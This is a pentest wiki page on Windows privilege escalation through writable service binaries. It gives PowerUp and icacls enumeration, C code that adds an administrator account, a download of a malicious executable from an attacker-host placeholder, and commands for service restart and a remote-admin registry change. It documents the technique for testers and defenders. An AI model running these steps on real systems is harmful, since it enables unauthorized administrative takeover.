---
authors: Anh4ckin3
category: infra
---

# 🛠️ Weak service permissions

## Theory

File permissions in Windows define who is allowed to access, modify, or execute files on the system. If these permissions are misconfigured, they can enable unauthorized users to alter or replace critical files, potentially leading to security vulnerabilities such as unauthorized access.

Below is a summary of Windows file permissions based on the provided table:

    F (Full access): Grants complete control over the file, including modifying and deleting it.
    M (Modify access): Allows editing and deleting the file, but not changing permissions.
    RX (Read and execute access): Permits viewing the file and executing it if it's an executable.
    R (Read-only access): Only allows viewing the file without making changes.
    W (Write-only access): Permits writing to the file but not reading or executing it.

## Pratice

### Insecure permissions on service executable 

#### Enumerate of vulnerable services
This type of abuse can occur when the binary of a Windows service is misconfigured. If the permissions for this binary allow a local user without special privileges to modify or replace it with a malicious version, the attacker may gain the privileges of the service account, which is often a high-privilege account.

Enumeration can be performed using PowerShell, either by leveraging native PowerShell commands (Living off the Land) or by utilizing additional tools and scripts like [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1). The main difference between the two lies in the results: PowerUp can identify whether a service is vulnerable, while PowerShell merely lists the binary services. In this example, the aniService service is misconfigured and vulnerable to this attack.

```powershell
# USING POWERSHELL
> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

# USING POWERUP
> Invoke-AllChecks
[*] Checking service executable and argument permissions...


ServiceName    : aniService
Path           : C:\Program Files\AniService\ani.exe
ModifiableFile : C:\Program Files\AniService\ani.exe
StartName      : LocalSystem
AbuseFunction  : Install-ServiceBinary -ServiceName 'aniService'
```
Once the vulnerable binary has been identified using a tool like PowerUp or Winpeas, the permissions of the binary can be checked with **icacls.exe**. The most relevant permissions to look for are (F) and (M), particularly when they are associated with a group such as `Everyone`: or a local user, for example.
```powershell
> icacls "C:\Program Files\AniService\ani.exe"
C:\Program Files\AniService\ani.exe
                                    AUTORITE NT\System:(F)
                                    BUILTIN\Administrators:(F)
                                    Everyone:(F)
                                    BUILTIN\Users:(RX)
```

####  Crafting a malicious binary
In the current practical case, the executable permission (F) is set for the "Everyone" group. However, if the permission had been set to (M), abuse would also have been possible. Due to this misconfiguration, the attacker can easily replace the binary with a malicious version. PowerUp can be used to automate this task.

```powershell
> Install-ServiceBinary -ServiceName 'aniService' -User vador -P "D4rkIsD@rk"
```

Once the command is executed, it will only be necessary to restart the service to ensure that the abuse has been successfully carried out.

The second method involves creating a custom malicious binary, which can offer advantages, such as bypassing antivirus detection. Below is a simple C code that will execute a Windows system command (the system command can, of course, be replaced with another).
```C
#include <stdlib.h>
int main ()
{
int i;
    i = system("net user vador D4rkIsD@rk /add && timeout /t 2 && net localgroup Administrators vador /add");
return 0;
}

```

To compile Windows Executable it is possible to use `i686-w64-mingw32-gcc`.
```bash
> i686-w64-mingw32-gcc CODE.C$ -lws2_32 -o FILE.EXE$
```

#### Replacing binaries
Due to the incorrect permissions, the attacker can replace the original executable by renaming it, for example. The attacker can then add the new malicious file with the same name as the original one.
```powershell
> move ani.exe ani.exe.bak

# DOWNLOAD THE MALICIOUS EXECUTABLE
> iwr http://<ATTACKER_IP>/malicious.exe -Outfile "C:\Program Files\AniService\ani.exe"
```

#### Methods for service restart
Once the binary is replaced, the service needs to be restarted. To verify if this is possible, a tool from the Sysinternals suite can be helpful, [accesschk.exe](https://download.sysinternals.com/files/AccessChk.zip) It is a tool that allows system administrators to quickly check the type of access users or specific groups have to resources, including files, directories, registry keys, global objects, and Windows services.
```powershell
> ./accesschk64.exe /accepteula -ucqv <SERVICE_NAME>

Copyright (C) 2006-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

aniService
  Medium Mandatory Level (Default) [No-Write-Up]
  R  DESKTOP-5VHCKF3\admin
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
```
The permissions that manage service startup are SERVICE_START and SERVICE_STOP. If these permissions are assigned to your user account or to a group that controls your access, you will be able to restart the service.
```powershell
# STOP SERVICE
> net stop <SERVICE_NAME>

# START SERVICE
> net start <SERVICE_NAME>
```
An alternative exists if the Startup permissions are not present. Using the sc.exe tool, the boot method used by the service can be checked. If it is set to AUTO_START, this means the service starts automatically during Windows boot.
```powershell
> sc.exe qc <SERVICE_NAME>
[SC] QueryServiceConfig réussite(s)

SERVICE_NAME: aniService
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\AniService\ani.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Anakin Skywalker Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```
There is a Windows privilege called **SeShutdownPrivilege**, which allows for rebooting a Windows system. With this privilege, it is possible to indirectly restart a service, even without having the direct permissions to do so.
```powershell
> shutdown /r /t 0
```
Once the service is rebooted, the payload should execute.

#### Configuring the LocalAccountTokenFilterPolicy

A small nuance when adding a local user: there is a registry key named **LocalAccountTokenFilterPolicy** that, when enabled, prevents users in the local Administrators group (except for those with a RID of 500, such as the built-in Administrator account) from obtaining full administrator rights during remote connections, such as to administrative shares like C$. To disable this restriction, the value of the key must be modified.
```powershell
> reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v LocalAccountTokenFilterPolicy /t Reg_DWORD /d 1
```

### Ressources 
[https://kb.cybertecsecurity.com/knowledge/localaccounttokenfilterpolicy](https://kb.cybertecsecurity.com/knowledge/localaccounttokenfilterpolicy)

[https://offsec.blog/hidden-danger-how-to-identify-and-mitigate-insecure-windows-services/](https://offsec.blog/hidden-danger-how-to-identify-and-mitigate-insecure-windows-services/)